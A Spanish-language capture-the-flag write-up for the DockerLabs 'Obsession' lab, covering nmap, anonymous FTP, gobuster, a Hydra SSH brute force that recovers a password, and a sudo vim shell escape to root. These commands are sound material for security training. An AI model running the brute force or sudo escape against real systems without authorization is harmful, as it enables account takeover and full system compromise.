# Obsession

## 📌 Información

| Campo             | Valor                                                  |
| ----------------- | ------------------------------------------------------ |
| Plataforma        | DockerLabs                                             |
| Máquina           | Obsession                                              |
| Dificultad        | Muy Fácil                                              |
| Sistema Operativo | Linux                                                  |
| Categoría         | Enumeración / Acceso Inicial / Escalada de Privilegios |

---

# 🎯 Objetivo

Obtener acceso inicial a la máquina **Obsession** y conseguir privilegios de **root**.

---

# 🛠 Herramientas

* Nmap
* Gobuster
* FTP
* Hydra
* SSH
* GTFOBins

# 🚀 COMENZANDO

● Descargar la VM de DockerLabs 

● Descomprimir la VM desde la terminal de Kali

```unzip Obsession.zip```

● Archivo descomprimido

```auto_deploy.sh```

● Pasar a Super_Usuario

```sudo su```

● Correr la VM

```sudo ./auto_deploy.sh Obsession.tar ```


---

# 🔍 Enumeración

## 1. Descubrimiento del objetivo

Primero identificamos la dirección IP asignada a la máquina.

```bash
ip addr
```

Comprobamos la conectividad:

```bash
ping TARGET_IP
```

---

## 2. Nmap

Realizamos un escaneo de los puertos:

```bash
nmap -p- TARGET_IP
```

Después realizamos una enumeración más detallada:

```bash
nmap -sC -sV TARGET_IP
```

### 🔎 Resultados

Se identificaron los siguientes servicios:

* **21/tcp → FTP**
* **22/tcp → SSH**
* **80/tcp → HTTP**

Uno de los primeros hallazgos interesantes fue que el servicio FTP permitía **acceso anónimo**.

### 📸 Resultados de Nmap

> Agregar aquí captura de Nmap.

---

# 📂 Enumeración FTP

Al encontrar FTP abierto, comprobamos si permitía acceso anónimo:

```bash
ftp TARGET_IP
```

Utilizamos:

```text
Usuario: anonymous
Contraseña: anonymous
```

Una vez dentro, listamos los archivos:

```bash
ls
```

Encontramos varios archivos de texto.

Para descargarlos:

```bash
mget *
```

### 🔎 Hallazgos

Los archivos descargados proporcionan información relacionada con usuarios y configuración de la máquina.

Entre la información obtenida aparecen posibles usuarios:

```text
Russoski
Gonza
Nagore
```

Esta información será útil para continuar la enumeración.

### 📸 Enumeración FTP

> Agregar captura del acceso FTP y de los archivos encontrados.

---

# 🌐 Enumeración Web

Continuamos investigando el servicio HTTP.

Accedemos mediante:

```text
http://TARGET_IP
```

La página está relacionada con un servicio de entrenamiento/fitness.

Durante la revisión de la página encontramos información relacionada con el usuario:

```text
Russoski
```

También encontramos una dirección de correo electrónico relacionada con el usuario.

---

## 🔎 Análisis del código fuente

Revisamos el código fuente de la página:

```text
Ctrl + U
```

Dentro del código encontramos información que indica que el usuario utiliza el mismo nombre de usuario para diferentes servicios.

Por este motivo:

```text
russoski
```

se convierte en un usuario interesante para investigar.

---

# 📂 Enumeración de directorios

Utilizamos Gobuster:

```bash
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt
```

### 🔎 Resultados

Se descubren algunos directorios interesantes:

```text
/backup
/important
```

Investigamos especialmente:

```text
/backup
```

Dentro encontramos:

```text
backup.txt
```

El archivo proporciona información adicional relacionada con el usuario:

```text
russoski
```

### 📸 Gobuster

> Agregar captura del resultado de Gobuster.

---

# 💣 Acceso Inicial

Después de la enumeración tenemos un posible usuario:

```text
Usuario: russoski
```

Como SSH está abierto en el puerto 22, podemos intentar obtener las credenciales mediante un ataque de fuerza bruta controlado.

Utilizamos Hydra:

```bash
hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP
```

Hydra consigue encontrar una contraseña válida:

```text
Usuario: russoski
Contraseña: iloveme
```

Utilizamos las credenciales para conectarnos mediante SSH:

```bash
ssh russoski@TARGET_IP
```

Comprobamos el usuario actual:

```bash
whoami
```

Resultado:

```text
russoski
```

También podemos comprobar nuestros grupos:

```bash
id
```

### 📸 Acceso Inicial

> Agregar captura de la conexión SSH y `whoami`.

---

# 🔑 Escalada de Privilegios

Una vez obtenido el acceso inicial, comenzamos a enumerar los privilegios del usuario.

Primero comprobamos los permisos de sudo:

```bash
sudo -l
```

Encontramos que el usuario puede ejecutar **Vim** con privilegios elevados sin necesidad de introducir una contraseña.

Esto puede permitirnos ejecutar comandos con privilegios de root.

---

# 🚀 Escalada mediante Vim

Buscamos la técnica correspondiente en GTFOBins.

Podemos utilizar:

```bash
sudo vim -c ':!/bin/sh'
```

Esto permite ejecutar una shell desde Vim utilizando los privilegios elevados otorgados por `sudo`.

Comprobamos nuestros privilegios:

```bash
whoami
```

Resultado:

```text
root
```

### 📸 Escalada de Privilegios

> Agregar captura de la ejecución de Vim y de `whoami`.

---

# 👑 Acceso Root

Finalmente comprobamos que tenemos privilegios administrativos:

```bash
whoami
```

Resultado:

```text
root
```

También podemos verificar:

```bash
id
```

El resultado confirma que hemos obtenido privilegios completos sobre la máquina.

### 📸 Root

> Agregar captura final demostrando acceso como root.

---

# 🧠 Lecciones Aprendidas

* La importancia de realizar una enumeración completa de los servicios.
* FTP anónimo puede exponer información sensible.
* Los archivos encontrados en FTP pueden proporcionar nombres de usuarios.
* El código fuente de una página web puede contener información útil.
* Gobuster permite descubrir directorios y archivos ocultos.
* Los usuarios descubiertos durante la enumeración pueden ser útiles para otros servicios.
* Hydra permite comprobar credenciales contra servicios como SSH en laboratorios autorizados.
* `sudo -l` es fundamental después de obtener acceso inicial.
* Los permisos incorrectos de `sudo` pueden permitir una escalada de privilegios.
* Programas como Vim pueden convertirse en una vía para obtener una shell privilegiada.

---

# 🏁 Conclusión

La máquina **Obsession** proporciona un entorno sencillo para practicar un flujo completo de pentesting.

El proceso comienza con la enumeración mediante Nmap, donde se identifican los servicios FTP, SSH y HTTP.

Posteriormente, el acceso FTP anónimo permite obtener información útil sobre los usuarios de la máquina.

La enumeración web proporciona información adicional y permite confirmar un usuario válido.

Después de identificar el usuario, se utiliza Hydra para obtener sus credenciales y acceder mediante SSH.

Finalmente, mediante la enumeración de privilegios con `sudo -l`, se descubre que Vim puede ejecutarse con privilegios elevados. Esto permite obtener una shell como **root**.

La cadena de ataque puede resumirse de la siguiente manera:

```text
Nmap
  ↓
FTP Anonymous
  ↓
Obtención de información
  ↓
Enumeración Web
  ↓
Gobuster
  ↓
Descubrimiento de usuario
  ↓
Hydra
  ↓
SSH
  ↓
sudo -l
  ↓
Vim
  ↓
Root
```

---

# ⚠️ Aviso

Esta práctica se realizó en un entorno creado intencionalmente para el aprendizaje de ciberseguridad.

Las técnicas documentadas deben utilizarse únicamente contra sistemas propios, laboratorios o sistemas para los cuales se tenga autorización explícita.
